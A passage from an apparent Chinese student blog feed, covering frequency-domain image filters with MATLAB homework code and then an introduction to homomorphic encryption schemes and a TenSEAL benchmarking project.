src="/posts/e5f414f6f9b3/image-20231205152135179.png" class="" title="image-20231205152135179"><p><strong>应用</strong>：印刷和出版业的预处理功能、美容处理（减少人脸皮肤细纹）</p><h4 id="理想低通滤波器-ILPF"><a href="#理想低通滤波器-ILPF" class="headerlink" title="理想低通滤波器(ILPF)"></a>理想低通滤波器(ILPF)</h4><p><strong>思想</strong>：截断傅里叶变换中所有高频成分</p><p><strong>定义</strong>：以$D_0$为半径的圆内所有频率分量无损的通过，圆外的所有频率分量完全衰减</p><p><style>.jgvvlkdrxsux{zoom: 67%;}</style><img src="/posts/e5f414f6f9b3/image-20231205152911789.png" class="jgvvlkdrxsux" alt="image-20231205152911789"></p><p>下面是一些实例</p><img src="/posts/e5f414f6f9b3/image-20231205153311813.png" class="" title="image-20231205153311813"><img src="/posts/e5f414f6f9b3/image-20231205153406695.png" class="" title="image-20231205153406695"><img src="/posts/e5f414f6f9b3/image-20231205153504913.png" class="" title="image-20231205153504913"><p>我们可以观察到理想低通滤波器存在的一些问题</p><ol><li><p><strong>模糊</strong></p><p>对于带高斯噪声的lenna图像，虽然半径为5时包含了90%的能量，但严重的模糊表明图片的大部分边缘信息包含在滤波器滤去的10%能量之中</p><p>之所以$D_0$较高时，图像越模糊，我们可以结合空间域来理解：<strong>频域的滤波越窄</strong>，空域滤波越宽，即<strong>空域滤波时模板的尺寸越大</strong></p></li><li><p><strong>振铃</strong></p><p>由于理想低通滤波<strong>在截止频率$D_0$附近对频谱过于粗暴的截断</strong>，导致对应空域滤波的图像外围会有一圈环形/多个环相互干扰，导致了振铃现象</p></li></ol><p>总而言之，理想低通滤波器并不实用，</p><p>但这也给出了设计方向：需要尽量减少振铃或没有振铃，以及减少模糊</p><h4 id="巴特沃思低通滤波器-BLPF"><a href="#巴特沃思低通滤波器-BLPF" class="headerlink" title="巴特沃思低通滤波器(BLPF)"></a>巴特沃思低通滤波器(BLPF)</h4><p><strong>思想</strong>：平滑的理想低通滤波器</p><img src="/posts/e5f414f6f9b3/image-20231205160249384.png" class="" title="image-20231205160249384"><p>相对于ILPF，BLPF的一个<strong>显著优点</strong>是在通过的频率与被滤掉的频率之间没有明显的截断</p><p>当阶数为1时，没有振铃现象</p><p>但是当阶数逐渐增高时，振铃现象会越来越明显，当阶数趋于无穷大时，BLPF=ILPF</p><img src="/posts/e5f414f6f9b3/image-20231205160633162.png" class="" title="image-20231205160633162"><p>而<strong>另一个优点</strong>是，当和ILPF采用相同的$D_0$时，BLPF<strong>可以保留更多高频成分</strong></p><img src="/posts/e5f414f6f9b3/image-20231205160841516.png" class="" title="image-20231205160841516"><p>可以说，BLPF是一种在有效低通滤波和可接受的振铃特性之间的折中方案</p><h4 id="高斯低通滤波器-GLPF"><a href="#高斯低通滤波器-GLPF" class="headerlink" title="高斯低通滤波器(GLPF)"></a>高斯低通滤波器(GLPF)</h4><p><strong>思想</strong>：彻底没有振铃现象</p><img src="/posts/e5f414f6f9b3/image-20231205161536224.png" class="" title="image-20231205161536224"><p>由于高斯滤波器的傅里叶反变换还是高斯，空域核没有震荡，所以不会产生振铃</p><h3 id="高通滤波"><a href="#高通滤波" class="headerlink" title="高通滤波"></a>高通滤波</h3><p>目的：高通滤波的效果通常是使模糊图像变得清晰，即<strong>图像锐化</strong>处理</p><p>但是，高通滤波在增强细节的前提下，也<strong>增加了图片中的噪声能量</strong>。所以高通滤波器<strong>所处理的图像需要有较高的信噪比</strong>，否则图像锐化后，图像信噪比会更低</p><p>常见的高通滤波器有以下几种</p><img src="/posts/e5f414f6f9b3/image-20231205204336189.png" class="" title="image-20231205204336189"><h4 id="理想高通滤波器-IHPF"><a href="#理想高通滤波器-IHPF" class="headerlink" title="理想高通滤波器(IHPF)"></a>理想高通滤波器(IHPF)</h4><p><strong>思想</strong>：截断傅里叶变换中所有低频成分</p><img src="/posts/e5f414f6f9b3/image-20231205204511826.png" class="" title="image-20231205204511826"><p>与理想低通滤波器类似，理想高通滤波器也存在振铃现象</p><img src="/posts/e5f414f6f9b3/image-20231205204555607.png" class="" title="image-20231205204555607"><h4 id="巴特沃思高通滤波器-BHPF"><a href="#巴特沃思高通滤波器-BHPF" class="headerlink" title="巴特沃思高通滤波器(BHPF)"></a>巴特沃思高通滤波器(BHPF)</h4><p><strong>思想</strong>：平滑理想高通滤波器</p><img src="/posts/e5f414f6f9b3/image-20231205204708295.png" class="" title="image-20231205204708295"><h4 id="高斯高通滤波器-GHPF"><a href="#高斯高通滤波器-GHPF" class="headerlink" title="高斯高通滤波器(GHPF)"></a>高斯高通滤波器(GHPF)</h4><p><strong>思想</strong>：彻底消除振铃现象</p><img src="/posts/e5f414f6f9b3/image-20231205204822977.png" class="" title="image-20231205204822977"><p>与GLPF性质类似的，GHPF比BHPF要稍微模糊，但彻底没有振铃现象</p><img src="/posts/e5f414f6f9b3/image-20231205204933258.png" class="" title="image-20231205204933258"><h4 id="高斯差分滤波器-DoG"><a href="#高斯差分滤波器-DoG" class="headerlink" title="高斯差分滤波器(DoG)"></a>高斯差分滤波器(DoG)</h4><p><strong>思想</strong>：高斯滤波器的推广版。引入更多参数，用于解决更具体的实际问题</p><img src="/posts/e5f414f6f9b3/image-20231205205116268.png" class="" title="image-20231205205116268"><h3 id="同态滤波"><a href="#同态滤波" class="headerlink" title="同态滤波"></a>同态滤波</h3><p>正常图像是在均匀光强度情况下获得的图像，实际上光照射是不均匀的，或者光强范围动态太大</p><p>同态滤波就是用于<strong>解决光照不均匀的影响</strong></p><img src="/posts/e5f414f6f9b3/image-20231205205330371.png" class="" title="image-20231205205330371"><p>同态滤波的基本思想是<strong>通过对数变换将光照的影响转换为传统噪声模型进行处理</strong></p><img src="/posts/e5f414f6f9b3/image-20231205205451271.png" class="" title="image-20231205205451271"><p>一般来说，光照的频率集中分布在低频部分</p><p>而反射到眼睛的图像种包含景物的各种信息，频率集中在高频分量</p><p>我们可以选择一种滤波函数，增强高频的贡献，减少低频的贡献</p><img src="/posts/e5f414f6f9b3/image-20231205205918409.png" class="" title="image-20231205205918409"><h1 id="HW1-巴特沃思低通滤波器"><a href="#HW1-巴特沃思低通滤波器" class="headerlink" title="HW1 巴特沃思低通滤波器"></a>HW1 巴特沃思低通滤波器</h1><p>作业要求：</p><blockquote><p>给定图像barb.png，利用一阶Butterworth低通滤波器进行频域滤波，当 $D_0$  = 10, 20, 40,80 时，给出相应滤波图像，并分别以频域和空域的观点解释有关滤波结果。</p><p> 提示： </p><p>（1）以 $(- 1)^{(x+y)}$ 乘以输入图像进行中心变换；</p><p>（2）直接以FFT2进行傅立叶变换；</p><p>（3）DFT反变换后取实部；</p><p>（4）以<script type="math/tex">(-1)^{(x+y)}</script>乘以（3）中结果，反中心变换。</p></blockquote><p>由于图像频域的原点不在正中央，无法直接用滤波器处理，所以我们需要对图像先进行中心变换</p><p>将频域的坐标原点从(0,0)移至中心，我们只需要将原图乘以 $(- 1)^{(x+y)}$后再进行傅里叶变换</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x = <span class="number">1</span>:rows</span><br><span class="line">    <span class="keyword">for</span> y = <span class="number">1</span>:cols</span><br><span class="line">        img(x, y) = img(x, y) * ((<span class="number">-1</span>)^(x+y));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">img_fft = fft2(img);</span><br></pre></td></tr></table></figure><p>巴特沃思公式如下</p><img src="/posts/e5f414f6f9b3/image-20231205160249384.png" class="" title="image-20231205160249384"><p>我们根据公式创建$H(u,v)$</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">H = <span class="built_in">zeros</span>(rows, cols);</span><br><span class="line"><span class="keyword">for</span> u = <span class="number">1</span>:rows</span><br><span class="line">    <span class="keyword">for</span> v = <span class="number">1</span>:cols</span><br><span class="line">        D = <span class="built_in">sqrt</span>((u - rows/<span class="number">2</span>)^<span class="number">2</span> + (v - cols/<span class="number">2</span>)^<span class="number">2</span>);</span><br><span class="line">        H(u, v) = <span class="number">1</span> / (<span class="number">1</span> + (D/D0)^(<span class="number">2</span> * <span class="number">1</span>)); <span class="comment">% 1阶</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>我们对频域图像进行滤波操作后再傅里叶逆变换得到空域图像</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filtered_img_fft = img_fft .* H;</span><br><span class="line">img_filtered = <span class="built_in">real</span>(ifft2(filtered_img_fft));</span><br></pre></td></tr></table></figure><p>最后我们需要将图片反中心变换回来</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x = <span class="number">1</span>:rows</span><br><span class="line">    <span class="keyword">for</span> y = <span class="number">1</span>:cols</span><br><span class="line">    img_filtered(x, y) = img_filtered(x, y) * ((<span class="number">-1</span>)^(x+y));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>最后保存生成的滤波图片及对比图即可</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="built_in">i</span>+<span class="number">1</span>), imshow(uint8(img_filtered)), title([<span class="string">&#x27;D0 = &#x27;</span>, num2str(D0)]);</span><br><span class="line">imwrite(uint8(img_filtered), [<span class="string">&#x27;filtered_D0_&#x27;</span> num2str(D0) <span class="string">&#x27;.png&#x27;</span>]);</span><br><span class="line">...</span><br><span class="line">saveas(gcf, <span class="string">&#x27;combined_filtered_images.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>运行程序，我们可以得到如下结果</p><img src="/posts/e5f414f6f9b3/combined_filtered_images.png" class="" title="combined_filtered_images"><p>观察结果，我们可以发现，<strong>低通滤波器使得图像变得模糊，而随着<script type="math/tex">D_0</script>增加，图像逐渐变得清晰</strong></p><p>从<strong>频域</strong>来讲，低通滤波器在频域中的作用是允许低频分量通过，同时削弱或阻止高频分量。在图像处理中，高频分量通常对应于图像的边缘和细节部分，而低频分量则对应于图像的平滑区域。所以低通滤波器会使得图像的细节损失，变得平滑，或者说变得模糊。</p><p>当 <script type="math/tex">D_0</script>增加时，更多的高频分量被允许通过。这意味着更多的细节和边缘信息被保留在图像中，因此图像变得更加清晰。</p><p>而从<strong>空域</strong>来讲，低通滤波可以看作是图像与一个平滑核的卷积。这个过程相当于”平均”图像中的像素值，使得图像变得平滑，也就是更加模糊。</p><p>当<script type="math/tex">D_0</script>增加时，根据巴特沃思低通滤波器的公式，频域的滤波变宽，空域滤波变窄，即空域滤波时模板的尺寸变小，此时图像平滑程度减弱，拥有更多细节信息。</p><h1 id="HW2-同态滤波器"><a href="#HW2-同态滤波器" class="headerlink" title="HW2 同态滤波器"></a>HW2 同态滤波器</h1><p>作业要求：</p><blockquote><p>采用同态滤波来增强图像‘office.jpg’细节，对数频域滤波器为：</p><p>$H(u,v) = (\gamma<em>{H} - \gamma</em>{L}) \left[ 1 - e^{-c\left(\frac{D(u,v)}{D<em>0}\right)^{2}} \right] + \gamma</em>{L}$</p><p>（1）参数选择：参考$\gamma<em>{H}$=2，$\gamma</em>{L}$ = 0.25 ， $C$ = 1。</p><p>（2）自己尝试不同的 $D_0$ 以得到最好的结果。</p><p>（3）如将滤波器替换为一阶Butterworth高通滤波器，比较滤波结果。</p><p>提示：对于滤波输出图像， 确定图像的最大和最小像素值max和min， 得到range=max-min，</p><p>对于f(x,y)，以255*(f(x,y)-min)/range，得到最好的显示效果。</p></blockquote><p>首先我们将原图转为灰度图像，同时由于后续要进行对数和指数操作，所以使用<code>im2double</code>将图像矩阵转为双精度</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">img = imread(<span class="string">&#x27;office.jpg&#x27;</span>);</span><br><span class="line">img = rgb2gray(img);</span><br><span class="line">img = im2double(img);</span><br></pre></td></tr></table></figure><p>我们将图像转为对数域，获取对数域的图像尺寸，然后进行傅里叶变换</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">imgLog = <span class="built_in">log</span>(<span class="number">1</span> + img);</span><br><span class="line">[M, N] = <span class="built_in">size</span>(imgLog);</span><br><span class="line">fftImg = fft2(imgLog);</span><br></pre></td></tr></table></figure><p>在设置滤波器参数后，我们创建同态滤波器</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gammaH = <span class="number">2</span>;</span><br><span class="line">gammaL = <span class="number">0.25</span>;</span><br><span class="line">c = <span class="number">1</span>;</span><br><span class="line">D0 = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 创建滤波器</span></span><br><span class="line">[U, V] = <span class="built_in">meshgrid</span>(<span class="number">1</span>:N, <span class="number">1</span>:M);</span><br><span class="line">D = <span class="built_in">sqrt</span>((U - N/<span class="number">2</span>).^<span class="number">2</span> + (V - M/<span class="number">2</span>).^<span class="number">2</span>);</span><br><span class="line">H = (gammaH - gammaL) * (<span class="number">1</span> - <span class="built_in">exp</span>(-c * (D/D0).^<span class="number">2</span>)) + gammaL;</span><br></pre></td></tr></table></figure><p>在对图像进行同态滤波后，对其进行傅里叶反变换以及指数操作</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">G = H .* fftShift;</span><br><span class="line">imgFiltered = <span class="built_in">real</span>(ifft2(ifftshift(G)));</span><br><span class="line">imgFiltered = <span class="built_in">exp</span>(imgFiltered) - <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>最后我们需要归一化图像，使得亮度显示效果最佳</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 确定最大和最小像素值</span></span><br><span class="line">minVal = <span class="built_in">min</span>(imgFiltered(:));</span><br><span class="line">maxVal = <span class="built_in">max</span>(imgFiltered(:));</span><br><span class="line"></span><br><span class="line"><span class="comment">% 计算range</span></span><br><span class="line">range = maxVal - minVal;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 归一化图像</span></span><br><span class="line">imgNormalized = <span class="number">255</span> * (imgFiltered - minVal) / range;</span><br></pre></td></tr></table></figure><p>我们将多个不同$D_0$值得到的滤波后结果放在一起对比，找出最好的结果</p><img src="/posts/e5f414f6f9b3/combined_filtered_images-17017924219472.png" class="" title="combined_filtered_images"><p>可以看出，当$D_0$为50时，效果就已经很好了</p><p>我们再创建一个1阶butterworth高通滤波器</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">1</span>;</span><br><span class="line">H_butterworth = <span class="number">1</span> ./ (<span class="number">1</span> + (D0 ./ D).^ (<span class="number">2</span> * n));</span><br></pre></td></tr></table></figure><p>展示D0=10时的对比结果</p><img src="/posts/e5f414f6f9b3/compare.png" class="" title="compare"><p>能够发现，虽然高通滤波器也能增加图像细节，但是<strong>图像的光照效果并不均匀</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> MATLAB </tag>
            
            <tag> Digital Image Processing </tag>
            
            <tag> project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开源库全同态加密算法效率比较</title>
      <link href="/posts/3c0eb5a1ba70/"/>
      <url>/posts/3c0eb5a1ba70/</url>
      
        <content type="html"><![CDATA[<h2 id="同态加密"><a href="#同态加密" class="headerlink" title="同态加密"></a>同态加密</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>在开始项目之前，我们需要回顾一下同态加密的知识</p><div class="note info flat"><p><strong>同态加密（Homomorphic encryption）</strong>是一种在加密数据上进行计算的技术，同时保证结果在解密后仍然有效。这种加密方法允许用户在不解密的情况下对加密数据进行操作，这在保护隐私的同时实现了数据的处理和分析。</p><p><img src="/posts/3c0eb5a1ba70/image-20231128144518785.png" class="" title="image-20231128144518785"></p></div><p>同态加密的意义在于，真正从根本上解决将数据及其操作委托给第三方时的保密问题，例如对于各种云计算的应用。</p><p>同态加密的算法需要满足以下属性：</p><ol><li><p><strong>正确性</strong>：</p><ul><li>对于未使用Eval函数的密文，如果$E$代表加密函数，$D$代表解密函数，$m$为明文，则正确性可以表示为：<script type="math/tex; mode=display">D(E(m)) = m</script>这意味着如果你对一个明文$m$进行加密，然后再解密，你应该得到原始的明文。</li><li>对于使用Eval函数的密文，如果$F$代表在明文上的运算函数，正确性可以表示为：<script type="math/tex; mode=display">D(Eval(E(m_1), E(m_2), \ldots)) = F(m_1, m_2, \ldots)</script>这表示如果你对多个加密后的数据应用Eval函数进行某种运算，然后解密，结果应该与在原始数据上直接应用该运算得到的结果相同。</li></ul></li><li><p><strong>隐私性</strong>：</p><ul><li>隐私性可以用不可区分性（indistinguishability）来表述。如果$m_1$和$m_2$是两个不同的明文，它们的加密结果（$E(m_1)$和$E(m_2)$）对于观察者来说应该是无法区分的。这通常表示为：<script type="math/tex; mode=display">\text{Pr}[E(m_1) = E(m_2)] \approx \text{Pr}[m_1 = m_2]</script></li></ul></li><li><p><strong>强同态</strong>：</p><ul><li>强同态属性要求加密数据和经过Eval函数求值后的密文在分布上应该是不可区分的。虽然这是理想状态，但在实际中很难实现，因此通常关注紧致性。</li></ul></li><li><p><strong>紧致性</strong>：</p><ul><li>紧致性关注的是密文尺寸的控制。如果$C$表示密文，$F$是计算函数，紧致性可以用以下方式表示：<script type="math/tex; mode=display">|Eval(C)| \leq \text{poly}(\text{length}(C), \text{size}(F))</script>这意味着经过Eval函数处理后的密文大小是原始密文大小和计算函数复杂性的多项式函数，而不是与这些因素呈指数关系增长。</li></ul></li></ol><p>这些公式和属性共同定义了同态加密系统的基本特性，确保即使在加密状态下进行计算，也能保持数据的安全性和隐私性。</p><p>同态加密分为三类：部分同态加密（PHE）、近似同态加密（SHE）和全同态加密（FHE）</p><h3 id="部分同态加密（PHE）"><a href="#部分同态加密（PHE）" class="headerlink" title="部分同态加密（PHE）"></a>部分同态加密（PHE）</h3><p>部分同态加密允许对加密数据执行<strong>一种类型的算术运算</strong>，通常是加法或乘法。在这种加密系统中，可以对加密数据进行无限次指定类型的运算</p><h4 id="加法同态"><a href="#加法同态" class="headerlink" title="加法同态"></a>加法同态</h4><p>在定义上，设$E$表示加密函数，$D$表示解密函数，$m_1$和$m_2$表示两个明文。如果系统是加法同态的，那么有：</p><p>$\begin{align<em>}<br>D(E(m_1) \oplus E(m_2)) &amp;= m_1 + m_2<br>\end{align</em>}$</p><p>其中，⊕表示在加密数据上进行的某种操作，它相当于明文上的加法。</p><p>加法同态加密的代表算法是<strong>Paillier</strong></p><p>Paillier加密算法是一种流行的非对称加密算法，由法国密码学家Pascal Paillier于1999年提出。</p><p>其安全性依赖于<strong>合数剩余判定假设</strong></p><div class="note info flat"><p><strong>合数剩余判定假设（CRA）</strong>是基于对特定合数的剩余类的难以区分性。具体来说，假设有两个大质数$p$和$q$，则对于模$n^2$（其中$n = pq$）的乘法群，很难区分一个随机选择的群元素是否是模$n^2$的$n$次幂。</p><p>在数学术语中，如果$x$是一个随机选择的模$n^2$的群元素，则区分$x$是不是一个$n$次剩余（即存在某个$y$使得$y^n \equiv x \mod n^2$）是困难的。</p></div><p>具体加解密流程如下：</p><img src="/posts/3c0eb5a1ba70/image-20231128152328005.png" class="" title="image-20231128152328005"><p>与传统的加法同态操作有所不同，Paillier加密系统中，明文的加法操作对应于密文的乘法操作</p><script type="math/tex; mode=display">\begin{align*}D(E(m_1, r_1)E(m_2, r_2) \mod n^2) &= D(g^{m_1}r_1^n g^{m_2}r_2^n \mod n^2) \\&= D(g^{m_1+m_2}(r_1r_2)^n \mod n^2) \\&= m_1 + m_2\end{align*}</script><h4 id="乘法同态"><a href="#乘法同态" class="headerlink" title="乘法同态"></a>乘法同态</h4><p>同样地，设$E$表示加密函数，$D$表示解密函数，$m_1$和$m_2$表示两个明文。如果系统是加法同态的，那么有：</p><p>$\begin{align<em>}<br>D(E(m_1) \otimes E(m_2)) &amp;= m_1 \times m_2<br>\end{align</em>}$</p><p>比较具有代表性的乘法同态加密算法是<strong>RSA和ElGamal</strong></p><img src="/posts/3c0eb5a1ba70/image-20231128160606567.png" class="" title="image-20231128160606567"><img src="/posts/3c0eb5a1ba70/image-20231128160657482.png" class="" title="image-20231128160657482"><h3 id="近似同态加密（SWHE）"><a href="#近似同态加密（SWHE）" class="headerlink" title="近似同态加密（SWHE）"></a>近似同态加密（SWHE）</h3><p>近似同态加密是一种介于PHE和FHE之间的加密形式。它支持对加密数据进行<strong>有限次的加法和乘法操作</strong>。然而，随着计算次数的增加，密文中的噪声也会增加，限制了可以执行的操作次数。</p><p>代表性的算法有下面几种</p><img src="/posts/3c0eb5a1ba70/image-20231128163517289.png" class="" title="image-20231128163517289"><p>下面是BGN的具体原理和算法流程</p><img src="/posts/3c0eb5a1ba70/image-20231128163655055.png" class="" title="image-20231128163655055"><h3 id="全同态加密-FHE"><a href="#全同态加密-FHE" class="headerlink" title="全同态加密(FHE)"></a>全同态加密(FHE)</h3><p>全同态加密是同态加密的最强形式，允许对加密数据执行<strong>无限次的加法和乘法运算</strong>。它使得在保持数据加密的情况下进行复杂计算成为可能。</p><p>全同态加密（FHE）的一个关键特性是其<strong>自举（bootstrapping）能力</strong>，这个概念是由Craig Gentry在他的博士论文中首次提出的。自举是一种技术，它使得全同态加密系统能够处理任意数量的计算操作，而不受到噪声的限制</p><div class="note info flat"><p><strong>自举</strong>是指在同态加密环境中，加密方案可以使用自己来刷新自己的密文。在同态加密操作中，计算会在密文中引入噪声。如果噪声积累到一定程度，将导致密文无法正确解密。自举技术允许对密文进行处理，以<strong>减少这种噪声</strong>，从而可以继续进行更多的计算操作。</p><p>这种操作可以递归地进行。也就是说，一个全同态加密方案可以对其自身的加密计算进行同态加密，并通过自举来去除在此过程中引入的噪声。</p></div><p>实现自举需要加密方案能够对其解密过程进行同态评估。这通常涉及到：</p><ul><li><p>将解密算法表示为一个低复杂度的算术电路。</p></li><li><p>使用同态加密方案来加密该电路的输入（即密文和解密密钥的加密版本）。</p></li><li><p>运行同态加密的解密电路，这样做会生成一个新的加密版本的密文，其中包含较少的噪声。</p></li></ul><img src="/posts/3c0eb5a1ba70/image-20231128165643146.png" class="" title="image-20231128165643146"><h3 id="第一代FHE"><a href="#第一代FHE" class="headerlink" title="第一代FHE"></a>第一代FHE</h3><p>Gentry的方案被视为第一代FHE。它首次提出了自举（bootstrapping）的概念，即通过自解密来减少密文中的噪声。Gentry的构造基于理想格，并为未来的FHE构造提供了原型。</p><p>算法原理如下</p><img src="/posts/3c0eb5a1ba70/image-20231128170636110.png" class="" title="image-20231128170636110"><p>其建立在AGCD困难问题上</p><img src="/posts/3c0eb5a1ba70/image-20231128170707291.png" class="" title="image-20231128170707291"><p>由于要满足正确性成立条件，该算法<strong>只支持次数较低的多项式密文运算</strong>，原因如下：</p><p>假设$ B=O(2^\lambda) $为fresh密文的噪音边界，则经过$d$层的乘法电路之后，噪音边界变为$ B^{2^d} $，则有：</p><script type="math/tex; mode=display">B^{2^d} = 2^{\lambda \cdot 2^d} < p = 2^{2\lambda} \implies d < O(\log\lambda)</script><p>第一代FHE的<strong>缺点</strong>在于<strong>整数的尺度非常大</strong>，导致<strong>效率非常低</strong></p><h3 id="第二代FHE"><a href="#第二代FHE" class="headerlink" title="第二代FHE"></a>第二代FHE</h3><p>第二代FHE的代表性算法为BGV</p><img src="/posts/3c0eb5a1ba70/image-20231128172824494.png" class="" title="image-20231128172824494"><p>建立在困难问题LWE上</p><img src="/posts/3c0eb5a1ba70/image-20231128172907120.png" class="" title="image-20231128172907120"><p>第二代FHE的特殊之处在于它<strong>在减小误差项上做出了探索</strong><br>主要方法有两种，密钥交换和模块交换</p><p><strong>密钥交换</strong>是一种在FHE中常用的技术，它允许将一个密文从一个密钥空间转换到另一个密钥空间，而不会解密密文本身。</p><p>首先生成一个包含旧密钥加密的新密钥的数据结构，这通常是通过旧密钥对新密钥的每个位进行加密得到的。然后通过这个数据结构将加密数据从旧密钥转换为新密钥的形式，这一步骤不涉及明文数据的解密过程。通过精心设计的密钥交换过程，可以限制或减少转换过程中引入的误差。</p><p><strong>模块交换</strong>将密文中的每个系数从一个大模数环切换到一个小模数环，这通常也会减少误差项的大小。针对同一个明文消息，将在模q下的密文c转换成在模p下的密文c’ ，可将同态加密累积误差总量减少约p/q倍</p><h3 id="第三代FHE"><a href="#第三代FHE" class="headerlink" title="第三代FHE"></a>第三代FHE</h3><p>第三代FHE的代表算法是GSW</p><p>其核心思想是利用矩阵的近似特征向量</p><p>基础方案如下</p><img src="/posts/3c0eb5a1ba70/image-20231128201002518.png" class="" title="image-20231128201002518"><p>但是通过线性代数方法，能够很容易找到C的特征向量与点对应的特征值，从而轻松破解该方案的加密体系</p><p>我们可以加入随机噪声</p><img src="/posts/3c0eb5a1ba70/image-20231128201112424.png" class="" title="image-20231128201112424"><p>但是仍然有缺点</p><img src="/posts/3c0eb5a1ba70/image-20231128201255259.png" class="" title="image-20231128201255259"><p>改进方案是利用二进制分解</p><img src="/posts/3c0eb5a1ba70/image-20231128201442926.png" class="" title="image-20231128201442926"><h3 id="第四代FHE"><a href="#第四代FHE" class="headerlink" title="第四代FHE"></a>第四代FHE</h3><p>第四代FHE的代表性算法是CKKS</p><p>它的特点是<strong>支持浮点数运算</strong></p><img src="/posts/3c0eb5a1ba70/image-20231128201559270.png" class="" title="image-20231128201559270"><h2 id="开源库算法效率比较"><a href="#开源库算法效率比较" class="headerlink" title="开源库算法效率比较"></a>开源库算法效率比较</h2><h3 id="项目设计"><a href="#项目设计" class="headerlink" title="项目设计"></a>项目设计</h3><p>本实验选择使用TenSEAL作为开源同态加密库，其代码托管于GitHub，链接如下：</p><p><strong>TenSEAL</strong>：<a href="https://github.com/OpenMined/TenSEAL">https://github.com/OpenMined/TenSEAL</a></p><p>该同态加密的开源库中实现了<strong>BFV和CKKS这两种全同态加密算法</strong></p><p>实验流程如下：</p><ol><li><strong>环境安装</strong>：安装开源库TenSEAL及其依赖环境</li><li><strong>准备测试数据</strong>：搜集一组图片当作测试数据，并将其预处理为64*64的分辨率</li><li><strong>加密数据</strong>：将测试图片使用选定的算法加密，记录花费的时间</li><li><strong>存入数据库</strong>：将加密数据与对应标签存入数据库</li><li><strong>查询匹配</strong>：加密查询图片，将其与数据库中的加密图像依次匹配，选取其中最相似的图片，并将其解密并展示，记录匹配的时间以及解密的时间，</li><li><strong>分析对比算法效率</strong>：分析各步骤的时间，以对比不同算法的效率和优缺点。</li></ol><p>其中第2、3、4、5步需要对不同算法重复进行</p><p>这里我们还需要明确加解密的流程</p><p>因为我们想要<strong>模拟一个查询图片服务的现实场景</strong></p><p>加密图片会储存在服务端的数据库，而需要匹配的图片则由用户端提供</p><p>在这种角色关系中，服务端相当于权威方，所以<strong>一开始的公私钥生成在服务端进行</strong></p><p>服务端使用公钥加密存储的图片，并<strong>将公钥分发给客户端</strong>，将私钥保留</p><p>客户端使用公钥加密测试图片后发送給服务端，<strong>服务端</strong>将其与数据库中的加密图片匹配，找到最相似的一张后<strong>使用私钥解密得到原图并返回给客户端</strong></p><p>整个过程可以用以下流程图来表示</p><img src="/posts/3c0eb5a1ba70/%E9%A1%B9%E7%9B%AE%E6%B5%81%E7%A8%8B-17013208703374.png" class="" title="项目流程"><p>当然这只是模拟现实世界的一种场景，在其他方案中公私钥的保存者和数据传输状态都不是固定的，<strong>本方案中弱化了对用户提供的数据的保护</strong>（可以通过额外的加密算法来提供安全性），而是将<strong>保护重心放在了数据库存储的图片上</strong>。</p><p>在我们的方案中，<strong>同态加密具体体现在图片的密态匹配过程</strong>，若原图的相似度最高，则密态下计算出的相似度也是最高的</p><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><p>创建一个新的python环境，并使用pip安装TenSEAL</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n TenSEAL python=3.8</span><br><span class="line">conda activate TenSEAL</span><br><span class="line">pip install tenseal</span><br></pre></td></tr></table></figure><img src="/posts/3c0eb5a1ba70/image-20231129084420443.png" class="" title="image-20231129084420443"><h3 id="准备测试数据"><a href="#准备测试数据" class="headerlink" 